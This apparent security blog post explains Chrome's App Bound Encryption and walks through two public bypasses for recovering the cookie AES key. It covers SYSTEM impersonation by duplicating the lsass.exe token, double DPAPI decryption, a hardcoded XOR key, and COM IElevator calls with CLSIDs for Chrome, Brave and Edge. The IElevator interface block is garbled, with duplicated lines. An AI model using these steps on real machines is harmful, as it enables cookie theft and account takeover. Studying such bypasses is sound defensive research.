---
layout: post
title: "Break down the App Bound Encryption"
nav_order: 2
has_children: false
parent: "Chrome credentials - 2025"

---

# Break down the Chrome App Bound Encryption 

<br>
App Bound Encryption (ABE) is a security feature introduced by Chromium in July 2024 to prevent external programs or other Chromium-based apps from decrypting sensitive user data, even if they are running under the same OS user context.

It ties cookie decryption to the Chrome application binary, preventing other processes from accessing stored secrets. The profile encryption key is still initially protected by DPAPI, but ABE adds a second layer. That second layer uses a Windows platform key stored in a secure system service, which only SYSTEM can access.


![alt text](/assets/Chome-App-Bound/screenshots/app-bound-encryption.png?raw=true)

[Google Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)

Google also add an internal layer of encryption based on CNG API and Xor with a fixed value.  Here it is how it happens in Chrome 

The Application bound provider (browser/os_crypt/app_bound_encryption_provider_win.cc) calls the elevation service through the DecryptAppBoundString function 

```
HRESULT res = os_crypt::DecryptAppBoundString(
  encrypted_key_string, decrypted_key_string, kCurrentProtectionLevel,
  maybe_new_ciphertext, last_error, &flags);
```

```
HRESULT DecryptAppBoundString(const std::string& ciphertext,
  std::string& plaintext,
  ProtectionLevel protection_level,
  std::optional<std::string>& new_ciphertext,
  DWORD& last_error,
  elevation_service::EncryptFlags* flags) 
```

This function uses the elevation_service 2 methods CoCreateInstance, CoSetproxyBlanket and to instanciate the COM object IElevator identified by its CLSID and IId. Then the DecryptData to get the decrypted Application Bound MasterKey.

```
 HRESULT hr = ::CoCreateInstance(
  install_static::GetElevatorClsid(), nullptr, CLSCTX_LOCAL_SERVER,
  install_static::GetElevatorIid(), IID_PPV_ARGS_Helper(&elevator));
```
```
hr = ::CoSetProxyBlanket(
  elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
  COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
  RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
```
```
hr = elevator->DecryptData(ciphertext_data.Get(), plaintext_data.Receive(),&last_error);
```

Elevation service (chrome/elevation_service/elevator.cc) function DecryptData implements few steps 

Elevated call to function CryptUnProtectData, using the function with SYSTEM privileges
```
// Decrypt using the SYSTEM dpapi store.
if (!::CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0,&intermediate)) {... }
```

Then impersonates current user to decrypt the key a second time with DPAPI user bounded.  

```
// Decrypt using the user store.
if (ScopedClientImpersonation impersonate; impersonate.is_valid()) {
  ...
  if (!::CryptUnprotectData(&intermediate, nullptr, nullptr, nullptr, nullptr,0, &output)) { ...}
  ...
}
```

Check calling process is Google Chrome 

```
const auto process = GetCallingProcess();
if (!process.IsValid()) {
  *last_error = ::GetLastError();
  return kErrorCouldNotObtainCallingProcess;
}
```

Finally process some PostProcessData function that is not referenced in the Chromium Code Search.

```
auto post_process_result = PostProcessData(plaintext_str, &flags);
``` 

Runassu finded out that the PostProcessData uses NCryptDecrypt function from ncrypt.dll and fixed key name "Google Chromekey1" stored in Microsoft Software Key Storage Provider to perform the CNG decryption.  The NCryptDecrypt also need System impersonation. 

```
SECURITY_STATUS NCryptDecrypt(
  [in]           NCRYPT_KEY_HANDLE hKey,
  [in]           PBYTE             pbInput,
  [in]           DWORD             cbInput,
  [in, optional] VOID              *pPaddingInfo,
  [out]          PBYTE             pbOutput,
  [in]           DWORD             cbOutput,
  [out]          DWORD             *pcbResult,
  [in]           DWORD             dwFlags
);
```


Finally the key is xored with another fixed key, hex value "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390" 


---

## **Decryption** 


The first bypass PoCs managed to exploit the elevator service in two different ways. 

- the runassu solution [chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption) reversed the full decryption algorithm. It performs the double DPAPI decryption with System and user privileges, parse the key, apply the CNG decryption then the Xor and finally performs the AES decryption of app bound encrypted key. 

- the xaitax solution directly [https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) implements the COM IElevator interface and take benefit of the DecryptData function that returns directly the cookies AES key. But it is limited by the GetCallingProcess() function check we have seen. It must be executed from Chrome legit application path C:\Program Files\Google\Chrome\Application. So a privilege elevation is also needed, as Admin to drop the file into the Application directory. 
xaitax also set up a dll injection that makes the code directly executable into Chrome's process. 

---

### ByPass using full decryption (runassu method)
<br>

This technique is based on the work of runassu [chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption). The proof of concept runs with Admin privileges. It explores the full process of cookies encryption used by chrome. The original code is written in python. Let's decompose it once again in Windows API calls.


#### What’s the idea?

- use DPAPI as SYSTEM on app_bound_encryption_key form Local State json 
- use DPAPI as targeted User on new key 
- parse the key 
- use CNG API to decrypt the AES key parsed
- xor with a hardcoded chrome key 
- finally decode the app bound encrytion key with the AES MasterKey obtained


#### **Extract Local State Key**

The application bound encrypted key is stored in the json too. `C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Local State` with key name "app_bound_encrypted_key"


#### **DPAPI Decryption as SYSTEM** 

This is the same process as password decryption. We call the CryptUnprotectData on app_bound_encrypted_key. In the same way as Chrome we proceed some System and user privileges impersonation. System privileges can be gained by duplicating the lsass.exe process token for example, or any ther process running with system privileges. In the same way any user process token can be used to impersonate the user. 

Token can be duplicate using processthreadsapi.h and securitybaseapi.h libraries. 

```
BOOL OpenProcessToken(
  [in]  HANDLE  ProcessHandle,
  [in]  DWORD   DesiredAccess,
  [out] PHANDLE TokenHandle
);
```

```
BOOL DuplicateTokenEx(
  [in]           HANDLE                       hExistingToken,
  [in]           DWORD                        dwDesiredAccess, // TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES;
  [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, // 2
  [in]           TOKEN_TYPE                   TokenType,// TOKEN_IMPERSONATE = 0x0004
  [out]          PHANDLE                      phNewToken
);
```

```
ImpersonateLoggedOnUser(lsassToken)
  // CryptUnProtectData  run as SYSTEM
RevertToSelf();
ImpersonateLoggedOnUser(someUserProcessToken)
  // CryptUnProtectData  run as User
RevertToSelf();
```

At the end of this stuff we get the Application bound key decrypted. It contains an AES encrypted key. Here starts the Chrome internal stuff with CNG and xor decryptions. 

#### **Structure of the Application bound Key**

```
+------------+------------+--------------+--------+------------------+--------+----------+-----+
| HeaderLen  |  Header    | ContentLen   | Flag   | EncryptedAESKey  |  IV    | Cipher   | Tag |
+------------+------------+--------------+--------+------------------+--------+----------+-----+
|  4 bytes   | N bytes     |   4 bytes     | 1 byte |    32 bytes      | 12 B   | M bytes  | 16B |
```


#### **AES Key derivation**

This part is a bit mysterious yet to me, as I didn't find where it is implemented. I just follow the runassu poc. 
The EncryptedAESKey 32 bytes is decrypted with NCryptDecrypt using SYSTEM privileges and key "Google Chromekey1" from Microsoft Software Key Storage Provider 
 


```
SECURITY_STATUS NCryptDecrypt(
  [in]           NCRYPT_KEY_HANDLE hKey,
  [in]           PBYTE             pbInput,
  [in]           DWORD             cbInput,
  [in, optional] VOID              *pPaddingInfo,
  [out]          PBYTE             pbOutput,
  [in]           DWORD             cbOutput,
  [out]          DWORD             *pcbResult,
  [in]           DWORD             dwFlags
);
```

It returns another bytes array, data structure, we need to extract 32 bytes once again from offset 2. This key is xored with hexa key "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390" 

Fianlly the last AES decryption using the xor decryption output as masterKey, the IV initialization vector and Tag stored in the decrypted Application Bound key. 


---

### Bypass using COM IElevator (xaitax method)
<br>

This proof of concept explores the use of browser-specific COM interface IElevator to invoke undocumented methods like DecryptData() via direct vtable dispatching.

COM (Component Object Model) is a Windows technology that allows software components to communicate across processes and languages.
COM objects expose interfaces with methods that other applications can invoke.
They support inter-process communication and code reuse.
Used by Windows internally (e.g., Shell, Office, Windows Defender).
Can be accessed via languages like C++, PowerShell, and VBScript.

In the case of App-Bound Encryption, Chrome uses an internal, brokered COM service to access the App-Bound Key and decrypt cookies.
[IElevator source code](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/chrome/elevation_service/elevator.cc)

So it is possible to call Chrome Elevator instance to access the `DecryptData` function and let Chrome do App bounded the stuff. This chapter is based on the research of xaitax in this [github repository](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)


#### **IElevator interface definition** 

The class IElevator acts as a COM client wrapper, exposing helper functions to locate and invoke three undocumented methods — RunRecoveryCRXElevated, EncryptData, and DecryptData. These are exposed through a manually declared vtable mapping, starting from index 3, since the first three vtable slots in a COM object typically represents standard IUnknown methods (QueryInterface, AddRef, Release).


```
IDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
  IElevator : public IUnknown {
  public:
      virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
          const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
          const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;

          const WCHAR* crx_path, const WCHAR* browser_appid, const WCHAR* browser_version,
          const WCHAR* session_id, DWORD caller_proc_id, ULONG_PTR* proc_handle) = 0;
      virtual HRESULT STDMETHODCALLTYPE EncryptData(
          ProtectionLevel protection_level, const BSTR plaintext,
          BSTR *ciphertext, DWORD *last_error) = 0;

          BSTR* ciphertext, DWORD* last_error) = 0;
      virtual HRESULT STDMETHODCALLTYPE DecryptData(
          const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
          const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
  };
}
```


#### **Calling IElevator**

The code first identifies the right CLSID and IID for the browser being targeted (Chrome, Edge, Brave), and attempts to instantiate the IElevator COM object using CoCreateInstance with CLSCTX_LOCAL_SERVER. It then sets a custom COM security blanket to enable impersonation through CoSetProxyBlanket, which is necessary for some RPC operations.

Once a valid COM pointer is obtained, the script extracts the encrypted master key from the browser’s Local State file (stored under os_crypt.app_bound_encrypted_key), skips the DPAPI prefix, and attempts to pass the raw encrypted blob to DecryptData. This decrypted output would, if everything goes well, represent the plaintext AES-GCM key used to encrypt browser cookies.


#### **Datas** 

Structure : name, processName, clsid, iid, userDataSubpath 

```
if (browserType == "chrome")
{
    return {
        // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
        {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
        {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "\\Google\\Chrome\\User Data\\Local State",
        "Chrome"};
}
else if (browserType == "brave")
{
    return {
        // https://github.com/brave/brave-core/blob/1bc3b9e011c17e16a7aba895cac7e845b87ba5dc/chromium_src/chrome/elevation_service/elevation_service_idl.idl
        {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
        {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
        "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
        "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "Brave"};
}
else if (browserType == "edge")
{
    return {
        // Thank you James Forshaw (@tyraniddo) - https://github.com/tyranid/oleviewdotnet
        {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
        {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "\\Microsoft\\Edge\\User Data\\Local State",
        "Edge"};
}
```



#### **COM object init**


```
HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, (void **)&elevator);
```

```
CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

```
#### **Decrypt via COM**

```
BSTR bstrPlainKey = nullptr;
hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
```

---

## Cookies structure 

A word about the cookies structure.  All the previous POC purpose were to get the AES Master key to decrypt the cookie encrypted_value 

Here is a C++ like full cookie structure 

```
#define MAX_STR 512
#define MAX_BIN 4096

struct ChromeCookie {
    int64_t creation_utc;
    char host_key[MAX_STR];
    char name[MAX_STR];
    char value[MAX_STR];
    char path[MAX_STR];
    int64_t expires_utc;
    char top_frame_site_key[MAX_STR];
    unsigned char encrypted_value[MAX_BIN];
    int encrypted_value_len;
    int is_secure;
    int is_httponly;
    int has_expires;
    int64_t last_access_utc;
    int is_persistent;
    int priority;
    char same_site[MAX_STR];
    int source_scheme;
    int source_port;
    char same_type[MAX_STR];
    int64_t creation_utc_dup;
    int has_cross_site_ancestor;
};

```

It's worth mentioning the host_key format is ".[domain]" like ".google.com" while the encrypted_value is composed by a sha256 hash of the host_key + cookie value. 

So what we get once decrypted is sha256(host_key) + cookie_decrypted_value
